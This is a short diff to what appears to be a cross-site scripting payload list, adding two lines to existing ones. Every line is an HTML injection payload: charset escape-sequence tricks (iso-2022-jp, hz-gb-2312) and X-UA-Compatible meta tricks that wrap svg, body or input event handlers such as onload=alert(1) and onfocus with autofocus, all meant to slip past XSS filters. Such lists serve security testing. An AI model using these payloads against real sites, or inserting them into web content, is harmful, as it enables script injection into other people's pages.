@@ -1,3 +1,5 @@
+<meta http-equiv="X-UA-Co" content=x=EmulateIE10><canvas id=x><body onload=x.getContext("2d").fillText(x,0,0,.0001)>
+<meta http-equiv="X-UA-Compa"content="x=edge"><svg onload=document.styleSheets[0].addRule("x",0);><switch/><style>*:after{content:counter(x)
 <meta charset=iso-2022-jp>%1B(B%1B><svg onload=alert(1)>%1B$B%1B
 %20~}%22%3Cmeta%20charset=hz-gb-2312%3E%3Csvg%20onload%3Dalert%281%29%3E~{
 %3Cmeta%20charset=iso-2022-jp%3E%1B(J+onfocus=alert(1)%20autofocus%3E%1B$(D%1B(
